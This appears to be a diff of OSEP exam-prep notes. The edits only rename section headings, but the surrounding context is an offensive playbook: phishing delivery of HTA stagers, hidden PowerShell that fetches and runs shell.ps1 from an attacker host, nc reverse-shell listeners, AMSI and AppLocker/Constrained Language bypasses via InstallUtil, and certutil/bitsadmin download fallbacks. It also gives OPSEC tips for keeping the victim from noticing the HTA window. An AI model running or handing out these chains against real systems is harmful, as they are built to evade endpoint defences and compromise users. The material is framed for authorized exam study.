@@ -42,7 +42,7 @@ For the official OSEP labs/exam, or systems you are written-authorized to test. 
      -u "Subject: issue" -m "see attached" -a ~/osep/payloads/web/stager.hta
    ```
 
-**Steps**:
+**Procedure**:
 1. First prove “HTA fires and JScript runs”: send `ok.hta` to the target (or open `http://LHOST/ok.hta` on a same-class controlled host). It only does one harmless HTTP callback (`/cb?u=<user>@<host>`) and drops no payload. **Seeing both `/ok.hta` and `/cb` in the server log proves mshta→JScript→ActiveX is fully open.**
 2. When there is no CLM (confirm with `powershell -ep bypass` as in step 3): use `stager.hta`. mshta runs its JScript; `WScript.Shell.Run` starts `powershell.exe -nop -w hidden -Command "IEX(DownloadString 'http://LHOST/shell.ps1')"`. Watch for:
    - web log `GET /stager.hta`, `GET /shell.ps1`;
@@ -401,7 +401,7 @@ Note: embedded C# matches m02-clm-bypass-runspace.cs logic; keep both in sync wh
 </html>
 ````
 
-**Verify**: web log shows `GET /xxx.hta` → `GET /shell.ps1` (or `/cb`) in order, then `nc -lvnp LPORT` gets a callback; `whoami` is the target user. If any link is missing, locate it with scenario 8’s “echo each stage” approach.
+**Validation**: web log shows `GET /xxx.hta` → `GET /shell.ps1` (or `/cb`) in order, then `nc -lvnp LPORT` gets a callback; `whoami` is the target user. If any link is missing, locate it with scenario 8’s “echo each stage” approach.
 
 **Failure branches and alternatives**:
 - If `mshta.exe` is denied by AppLocker (policy tightened even for System32) → switch to `cscript/wscript` JScript (see M03 scenarios 9–10), or another signed host allowed by default.
@@ -409,7 +409,7 @@ Note: embedded C# matches m02-clm-bypass-runspace.cs logic; keep both in sync wh
 - If `DownloadString` is blocked (AMSI/Defender scanning IEX content) → run `Disable AMSI` first (same cheat sheet section) then IEX, or jump straight to scenario 7’s combined chain.
 - If egress is proxy-only → in shell.ps1 set `[System.Net.WebRequest]::DefaultWebProxy` explicitly (see M09 scenario 28).
 
-**Exam notes / OPSEC**: HTA flashes a desktop window — use `<HTA:APPLICATION ... WINDOWSTATE="minimize">` and `self.close()` at the end so it does not sit in front of the user; keep real attacker domains out of the mail body and use business-looking lures; run the harmless callback before any payload so you do not burn a whole mail round on a dead entry.
+**Exam / OPSEC notes**: HTA flashes a desktop window — use `<HTA:APPLICATION ... WINDOWSTATE="minimize">` and `self.close()` at the end so it does not sit in front of the user; keep real attacker domains out of the mail body and use business-looking lures; run the harmless callback before any payload so you do not burn a whole mail round on a dead entry.
 
 ---
 
@@ -438,7 +438,7 @@ Note: embedded C# matches m02-clm-bypass-runspace.cs logic; keep both in sync wh
 3. Optional: `certutil -encode m02stage64.exe enc.txt` so the runner can travel as text through mail/download (decode on target with `certutil -decode`; see cheat sheet steps).
 4. Place exe/enc.txt and shell.ps1 at the Kali web root; start `python3 -m http.server` and `nc -lvnp LPORT`.
 
-**Steps**:
+**Procedure**:
 1. Recon that all three are present (`m00-recon-defenses.ps1`): effective AppLocker rules, language mode `ConstrainedLanguage`, whether `amsi.dll` is in the process (cheat sheet `Enumerate Defenses` / `Disable AMSI`). Only then is this chain worth running.
 2. First run `m02-hta-callback.hta` to confirm the mshta host itself is not blocked by policy/AV by process name (callback `GET /cb` is enough).
 3. Use `m02-hta-embedded-clm-bypass.hta` (single file: embedded C# + on-target csc + InstallUtil /U) or manually run the equivalent “download→decode→InstallUtil” chain:
@@ -619,7 +619,7 @@ Test status: Not Windows-lab tested (this host is macOS); JScript syntax hand-re
 </html>
 ````
 
-**Verify**: the chain has 4–5 HTTP echo points (`hta-start` / `cs-written` / `compile-ok` / `installutil-called` / final nc callback). On the exam, locate by which echo stops: stop before compile = write/csc blocked; stop after InstallUtil with no callback = runner bitness wrong or shell.ps1 blocked by AMSI/AV. Finish with `whoami` + `ipconfig /all` for identity and segment.
+**Validation**: the chain has 4–5 HTTP echo points (`hta-start` / `cs-written` / `compile-ok` / `installutil-called` / final nc callback). On the exam, locate by which echo stops: stop before compile = write/csc blocked; stop after InstallUtil with no callback = runner bitness wrong or shell.ps1 blocked by AMSI/AV. Finish with `whoami` + `ipconfig /all` for identity and segment.
 
 **Failure branches and alternatives**:
 - If x64 runner has no callback but x86 does (or vice versa) → bitness mismatch; swap the other build; confirm actual mshta/InstallUtil bitness (Framework64 is 64-bit).
@@ -627,7 +627,7 @@ Test status: Not Windows-lab tested (this host is macOS); JScript syntax hand-re
 - If the AMSI-handling line itself is blocked (`AmsiUtils` string is a signature) → switch to other reflection styles from the `Disable AMSI` section or string-split concatenation; keep host-process bitness matched.
 - If on the real target “each link works alone, chained together does nothing” → triage timing per scenario 8; do not assume AV.
 
-**Exam notes / OPSEC**: the three-piece combined chain **must be walked end-to-end on the lab net** before the exam — order, bitness, missing references, InstallUtil paths that were never verified are time sinks; keep x64/x86 copies of runner and shell.ps1 and pick by measured target; avoid large Meterpreter payloads — simple TCP reverse + AMSI handling is most stable (cheat sheet notes some samples fail with AMSI on); HTA still flashes briefly — minimize + immediate `self.close()`.
+**Exam / OPSEC notes**: the three-piece combined chain **must be walked end-to-end on the lab net** before the exam — order, bitness, missing references, InstallUtil paths that were never verified are time sinks; keep x64/x86 copies of runner and shell.ps1 and pick by measured target; avoid large Meterpreter payloads — simple TCP reverse + AMSI handling is most stable (cheat sheet notes some samples fail with AMSI on); HTA still flashes briefly — minimize + immediate `self.close()`.
 
 ---
 
@@ -639,7 +639,7 @@ Test status: Not Windows-lab tested (this host is macOS); JScript syntax hand-re
 
 **Prepare (attacker side)**: put 3 files on the static server: `m02-hta-download-exec-split.hta`, the download source (`shell.ps1` or `stage2.ps1`), and `ok.txt` probe. Listen with `nc -lvnp LPORT`. **Also keep a terminal on `tail -f` of the web access log** — every conclusion in this scenario comes from log order, not guessing.
 
-**Steps**:
+**Procedure**:
 1. Gather evidence; answer four questions (check the web log line by line):
    1. Is there `GET /xxx.hta`? No → delivery/trigger problem, not the exec chain;
    2. Is there the HTA first-line echo (`/cb?stage=hta-start`)? No → JScript inside mshta never ran;
@@ -663,7 +663,7 @@ Test status: Not Windows-lab tested (this host is macOS); JScript syntax hand-re
 | `m02-hta-callback.hta` | Confirm HTA trigger and egress (first triage step) | replace `LHOST` |
 | `m02-hta-powershell-stager.hta` | Control: one-step IEX (“merged” shape) | replace `LHOST` |
 
-**Verify**: web log shows ordered echoes `hta-start → download-done → exec-done`; `nc` gets a callback. Side-by-side logs of “failed shape” vs “split shape” point at the broken stage; stable split success = problem located.
+**Validation**: web log shows ordered echoes `hta-start → download-done → exec-done`; `nc` gets a callback. Side-by-side logs of “failed shape” vs “split shape” point at the broken stage; stable split success = problem located.
 
 **Failure branches and alternatives**:
 - If PowerShell download is blocked but browser/mshta egress is fine → switch downloader to `certutil -urlcache -split -f URL OUT` or `bitsadmin /transfer` (M10 download matrix applies).
@@ -671,7 +671,7 @@ Test status: Not Windows-lab tested (this host is macOS); JScript syntax hand-re
 - If you suspect scan races → fixed `WScript.Sleep(2000~5000)` between stages, or poll until the file is readable then exec.
 - If mshta `self.close()` takes children with it → launch exec via `schtasks` or `wmic process call create` to leave the host process tree (lifecycle fix; check AppLocker allowlists).
 
-**Exam notes / OPSEC**: biggest pitfall is “swap AV bypasses without reading logs” and burning time — **echo first, conclude second**; split-stage echo points are triage evidence you can show on the exam; if a single-file merge must go to the user, keep the window minimized and close immediately so “download finished but window still open” is not noticed; prefer writing under `C:\Windows\Tasks` or `%TEMP%` to avoid protected-directory write alerts.
+**Exam / OPSEC notes**: biggest pitfall is “swap AV bypasses without reading logs” and burning time — **echo first, conclude second**; split-stage echo points are triage evidence you can show on the exam; if a single-file merge must go to the user, keep the window minimized and close immediately so “download finished but window still open” is not noticed; prefer writing under `C:\Windows\Tasks` or `%TEMP%` to avoid protected-directory write alerts.
 
 ---
 
